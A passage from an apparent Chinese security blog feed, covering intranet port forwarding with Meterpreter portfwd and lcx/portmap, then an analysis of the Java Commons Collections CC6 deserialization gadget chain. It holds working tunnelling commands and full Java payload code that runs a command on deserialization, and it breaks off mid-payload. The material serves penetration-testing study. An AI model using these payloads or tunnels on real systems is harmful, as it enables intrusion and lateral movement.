plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure><p>可以看到 3389 端口已开放：</p><img src="/images/image-20240407090636373.png"><h3 id="MSF-portfwd-端口转发与端口映射"><a href="#MSF-portfwd-端口转发与端口映射" class="headerlink" title="MSF portfwd 端口转发与端口映射"></a>MSF portfwd 端口转发与端口映射</h3><p>portfwd 是借用 meterpreter shell 建立的连接进行数据传输，达到端口转发的目的。</p><p>使用 portwd 进行端口转发：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 1111  -r 127.0.0.1 -p 3389</span><br></pre></td></tr></table></figure><p>-l 表示 localhost ，即 kali 本机；</p><p>因为此时已经与 Windows 目标机器建立了连接，所以 127.0.0.1 指的是已经被拿到 shell 的这台 Windows 机器。</p><p>配置完成后，访问 kali 的 1111 端口，就会转发到 Windows 目标机器的 3389 端口。</p><p><strong>如果将 127.0.0.1 换成其他与 Windows 目标机器处于同一内网的 IP ，那么就可以直接将内网中的其他机器映射到 kali 上，实现内网穿透。</strong></p><p>查看是否建立端口转发连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd list</span><br></pre></td></tr></table></figure><p>按本地端口号删除删除连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd delete -l 1111</span><br></pre></td></tr></table></figure><h3 id="lcx-exe-端口转发工具"><a href="#lcx-exe-端口转发工具" class="headerlink" title="lcx.exe 端口转发工具"></a>lcx.exe 端口转发工具</h3><p>lcx.exe 是一个端口转发工具，有 Windows 版和 Linux 版两个版本，Windows 版是 lcx.exe ，Linux 版为 portmap 。</p><p>下载链接：<a href="http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip">http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip</a></p><p><strong>Linux 中的使用</strong> </p><p>Linux 中下载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip</span><br></pre></td></tr></table></figure><p>查看帮助文档：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/lcx_vuln.cn]</span><br><span class="line">└─# ./portmap --help</span><br><span class="line">Socket data transport tool</span><br><span class="line"></span><br><span class="line">by Sofia(www.vuln.cn)</span><br><span class="line">Usage:./portmap -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-log filename]</span><br><span class="line"> -v: version</span><br><span class="line"> -h1: host1</span><br><span class="line"> -h2: host2</span><br><span class="line"> -p1: port1</span><br><span class="line"> -p2: port2</span><br><span class="line"> -log: log the data</span><br><span class="line"> -m: the action method for this tool</span><br><span class="line"> 1: listen on PORT1 and connect to HOST2:PORT2</span><br><span class="line"> 2: listen on PORT1 and PORT2</span><br><span class="line"> 3: connect to HOST1:PORT1 and HOST2:PORT2</span><br><span class="line">Let me exit...all overd</span><br></pre></td></tr></table></figure><p>这里有一个 -m 参数这个参数的解释：以哪种方式来用这个工具，然后下面有三个方式：<br>1.监听 port1 端口并且连接主机 2 的 port2 端口<br>2.监听 port1 和 port2 端口<br>3.连接主机 1 对应的端口和主机 2 对应的端口</p><p><strong>示例</strong> </p><p>将本机的 6666 端口映射到 192.168.164.8 主机的 22 端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./portmap -m 1 -p1 6666 -h2 192.168.164.8 -p2 22</span><br></pre></td></tr></table></figure><p>将本地 7777 端口上的服务转发到 6666 端口上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./portmap -m 2 -p1 6666 -h2 118.*.*.2 -p2 7777</span><br></pre></td></tr></table></figure><p>将本地 22 端口转发到外网机器上的 6666 端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 118.*.*.2 -p2 6666</span><br></pre></td></tr></table></figure><p><strong>Windows 中的使用</strong> </p><p><strong>1、lcx 内网端口转发，内网穿透</strong> </p><p>把内网主机的 3389 端口转发到具有公网 ip 主机的 4444 端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 公网主机ip 4444 127.0.0.1 3389</span><br></pre></td></tr></table></figure><p>监听公网主机本机的 4444 端口请求，并将来自 4444 端口的请求传送给 5555 端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe –listen 4444 5555</span><br></pre></td></tr></table></figure><p>此时，RDP 连接，Windows 命令行下输入 mstsc ，即可打开远程桌面连接。</p><p><strong>2、本地端口转发</strong> </p><p>由于防火墙限制，部分端口如 3389 无法通过防火墙，此时可以将该目标主机的 3389 端口转发到防火墙允许的其他端口，如 53 端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -tran 53 目标主机ip 3389</span><br></pre></td></tr></table></figure><h3 id="各种端口转发后如何连接"><a href="#各种端口转发后如何连接" class="headerlink" title="各种端口转发后如何连接"></a>各种端口转发后如何连接</h3><p>80 端口：直接浏览器访问即可；</p><p>3389 端口：使用 rdesktop 命令，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:3389</span><br></pre></td></tr></table></figure><p>3306 端口：使用 mysql 命令，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u [用户名] -p [密码] -P [端口号]</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;在进行渗透测试过程中会遇到内网中的其他机器是不允许外网机器访问的，因此需要通过端口转发(即隧道)或将得到的外网服务器设置为代理，使得攻击机可以直接访问并操作内网中的其他机器，这一过程就叫做内网转发。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="https://changeyourway.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>漏洞篇 - Java 反序列化之 CC6 链</title>
    <link href="https://changeyourway.github.io/2024/05/13/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC6%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>https://changeyourway.github.io/2024/05/13/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC6%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2024-05-13T09:15:09.329Z</published>
    <updated>2024-05-27T01:09:24.668Z</updated>
    
    <content type="html"><![CDATA[<p>前面在分析 CC1链 的 ysoserial 版时，我们知道 LazyMap 的 get 方法会调用成员属性 factory 的 transform 方法，而我们上一次是通过 AnnotationInvocationHandler 的 invoke 方法来调用这个 get 方法的。那么还有哪里能调用 LazyMap 的 get 方法呢？我们的 CC6 链给出了另一条路径：TiedMapEntry 类的 getValue 方法会调用成员属性的 get 方法。</p><span id="more"></span><h2 id="CC6-链分析"><a href="#CC6-链分析" class="headerlink" title="CC6 链分析"></a>CC6 链分析</h2><p>JDK 8u71 版本之后 AnnotationInvocationHandler 的 readObject 方法被改写，CC1 链无法利用，于是引出了可以不需要经过 AnnotationInvocationHandler 类的 CC6 链。</p><h4 id="利用链之-TiedMapEntry-类"><a href="#利用链之-TiedMapEntry-类" class="headerlink" title="利用链之 TiedMapEntry 类"></a>利用链之 TiedMapEntry 类</h4><h6 id="TiedMapEntry-的-getValue-方法："><a href="#TiedMapEntry-的-getValue-方法：" class="headerlink" title="TiedMapEntry 的 getValue 方法："></a>TiedMapEntry 的 getValue 方法：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Object getValue() &#123;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>map 是 TiedMapEntry 类中定义的一个属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private final Map map;</span><br></pre></td></tr></table></figure><p>这个成员属性在 TiedMapEntry 的构造方法中被赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public TiedMapEntry(Map map, Object key) &#123;</span><br><span class="line">    super();</span><br><span class="line">    this.map = map;</span><br><span class="line">    this.key = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这个构造方法被 public 修饰，可以直接调用。那么只需要将 this.map 设置成 LazyMap 对象就好了。将 this.map 设置成 LazyMap 对象以后，在 TiedMapEntry 的 getValue 方法中，会将 TiedMapEntry 的 成员属性 key 作为 LazyMap 对象的 get 方法的参数传入，这个 key 接下来会被作为 transform 的参数，那么就应该知道 key 应该传什么了，应该传 Runtime.class 。</p><p>接下来要找谁调用了 TiedMapEntry 的 getValue 方法，TiedMapEntry 的 hashCode 方法调用了此方法。</p><h6 id="TiedMapEntry-的-hashCode-方法："><a href="#TiedMapEntry-的-hashCode-方法：" class="headerlink" title="TiedMapEntry 的 hashCode 方法："></a>TiedMapEntry 的 hashCode 方法：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public int hashCode() &#123;</span><br><span class="line">    Object value = getValue();</span><br><span class="line">    return (getKey() == null ? 0 : getKey().hashCode()) ^</span><br><span class="line">           (value == null ? 0 : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要想调用 TiedMapEntry 的 hashCode 方法，可以把 TiedMapEntry 对象作为 HashMap 对象的 key 传入，这样在反序列化 HashMap 对象时，调用 HashMap 对象的 readObject 方法，就会调用 key 的 hashCode 方法。这是在学习 URLDNS 链时已经学到的内容，这里不妨再复习一下。</p><h4 id="入口类之-HashMap"><a href="#入口类之-HashMap" class="headerlink" title="入口类之 HashMap"></a>入口类之 HashMap</h4><h6 id="HashMap-的-readObject-方法："><a href="#HashMap-的-readObject-方法：" class="headerlink" title="HashMap 的 readObject 方法："></a>HashMap 的 readObject 方法：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    // Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                // Read and ignore number of buckets</span><br><span class="line">    int mappings = s.readInt(); // Read number of mappings (size)</span><br><span class="line">    if (mappings &lt; 0)</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +</span><br><span class="line">                                         mappings);</span><br><span class="line">    else if (mappings &gt; 0) &#123; // (if zero, use defaults)</span><br><span class="line">        // Size the table using given load factor only if within</span><br><span class="line">        // range of 0.25...4.0</span><br><span class="line">        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);</span><br><span class="line">        float fc = (float)mappings / lf + 1.0f;</span><br><span class="line">        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((int)fc));</span><br><span class="line">        float ft = (float)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (int)ft : Integer.MAX_VALUE);</span><br><span class="line">        @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        // Read the keys and values, and put the mappings in the HashMap</span><br><span class="line">        for (int i = 0; i &lt; mappings; i++) &#123;</span><br><span class="line">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, false, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结尾处的这一句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putVal(hash(key), key, value, false, false);</span><br></pre></td></tr></table></figure><p>会调用 HashMap 的 hash 方法。</p><h6 id="HashMap-的-hash-方法："><a href="#HashMap-的-hash-方法：" class="headerlink" title="HashMap 的 hash 方法："></a>HashMap 的 hash 方法：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static final int hash(Object key) &#123;</span><br><span class="line">    int h;</span><br><span class="line">    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里就会调用 key 的 hashCode 方法。</p><p>利用链已经明了，开始构造 payload 。</p><h4 id="构造-payload1"><a href="#构造-payload1" class="headerlink" title="构造 payload1"></a>构造 payload1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class payload &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 获取包含执行类的 ChainedTransformer 对象</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                // 将传入参数固定为 Runtime.class</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 新建一个 Map 对象，无关紧要，只是作为参数传入</span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 LazyMap</span><br><span class="line">        Map lazymap = LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 TiedMapEntry</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, Runtime.class);</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 HashMap</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(tiedMapEntry, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        serialize(map);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload 构造完成，但是在运行的时候会发现一个问题，就是序列化的时候也会进行一次命令执行，原因是 HashMap 的 put 方法也会调用 key 的 hashCode 方法。</p><p><strong>HashMap 的 put 方法：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">    return putVal(hash(key), key, value, false, true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会调用 HashMap 的 hash 方法，进而调用 key 的 hashCode 方法。</p><p>我们肯定不希望自己的计算机上也执行一遍恶意命令对吧，所以我们需要避免序列化的时候命令执行，这也是以后的反序列化利用需要注意的问题。</p><h4 id="改进-payload"><a href="#改进-payload" class="headerlink" title="改进 payload"></a>改进 payload</h4><p>如何避免序列化时命令执行呢，在 map.put 方法执行之前，我们先传入一个不包含 chainedTransformer 的 LazyMap 对象，在 map.put 方法执行之后，再修改这个 LazyMap 对象的 factory 属性为 chainedTransformer 即可。</p><h6 id="问题抛出"><a href="#问题抛出" class="headerlink" title="问题抛出"></a>问题抛出</h6><p>然而当我这样修改之后，又发现了一个问题：</p><p>我在调用 TiedMapEntry 构造方法时： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public TiedMapEntry(Map map, Object key) &#123;</span><br><span class="line">    super();</span><br><span class="line">    this.map = map;</span><br><span class="line">    this.key = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>明明代码上只写了将传入的 key 作为 TiedMapEntry 对象的 key 属性值，但是在执行完这一步后发现 TiedMapEntry 对象的 map 属性的 key 属性值也变为了传入的 key 值。</p><p>执行 this.key &#x3D; key 之前，map 中只有一个 null -&gt; 1 的键值对：</p><img src="/images/image-20240514174305665.png"><p>执行 this.key &#x3D; key 之后，map 中多了一个 aaa -&gt; 1 的键值对：</p><img src="/images/image-20240514174609890.png"><p>很奇异，翻了很多大佬的博客，但是都没有讲明原因，后来与好友交流，得出了一种较为合理的解释。</p><p>参见：<a href="https://yyjccc.github.io/2024/05/14/%E5%B9%BD%E9%BB%98%E7%9A%84Common-Collections6%E8%B0%83%E8%AF%95/">幽默的Common-Collections6调试</a> </p><p>还记得我们之前说过的吗：IDEA 在 debug 时，当 debug 到某个对象的时候，会调用对象的 toString() 方法，用来在 debug 界面显示对象信息。</p><p>这里正是由于 TiedMapEntry 对象的 toString() 方法在调试时被调用了，来看 TiedMapEntry 的 toString() 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public String toString() &#123;</span><br><span class="line">    return getKey() + &quot;=&quot; + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调用了 TiedMapEntry 的 getValue() 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Object getValue() &#123;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是就会接着调用其成员属性 map 的 get() 方法，也即 LazyMap 对象的 get() 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public Object get(Object key) &#123;</span><br><span class="line">    // create value for key if key is not currently in the map</span><br><span class="line">    if (map.containsKey(key) == false) &#123;</span><br><span class="line">        Object value = factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一次进来，LazyMap 对象的 map 属性 key 值为 null ，不包含传入的 key 值，所以进入判断，在 <code>map.put(key, value);</code> 处将 LazyMap 对象的 map 属性 key 值设置成了传入的 key 值，这就造成了调试完 TiedMapEntry 构造方法后 LazyMap 对象的 map 属性就已经有 key 值了。</p><p>所以如果是真实运行环境的话，它的流程应该是这样的：在 TiedMapEntry 的构造方法被调用之后，调用 HashMap 的 put 方法时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TiedMapEntry tiedMapeEntry = new TiedMapEntry(lazymap, &quot;key&quot;);</span><br><span class="line">HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();</span><br><span class="line">map2.put(tiedMapeEntry, &quot;test&quot;);</span><br></pre></td></tr></table></figure><p>运行时调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map2::put() -&gt; map2::hash() -&gt; tiedMapeEntry::hashCode() -&gt; tiedMapeEntry::getValue() -&gt; lazymap::get()</span><br></pre></td></tr></table></figure><p>于是在这里 lazymap 的 map 属性的 key 值被设置成了传入的 key 值，这将导致下一次调用 lazymap 的 get() 方法时（反序列化时）将不会进入判断，从而无法命令执行。</p><p>所以需要在 put 方法调用完之后删除掉 lazymap 的 map 属性的 key 值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lazymap.remove(&quot;key&quot;);</span><br></pre></td></tr></table></figure><h4 id="构造-payload2"><a href="#构造-payload2" class="headerlink" title="构造 payload2"></a>构造 payload2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class payload2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 获取包含执行类的 ChainedTransformer 对象</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                // 将传入参数固定为 Runtime.class</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 新建一个 Map 对象，无关紧要，只是作为参数传入</span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 LazyMap</span><br><span class="line">        Map lazymap = LazyMap.decorate(hashMap, new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 TiedMapEntry ，第二个参数为 key 值，先随便传一个</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, 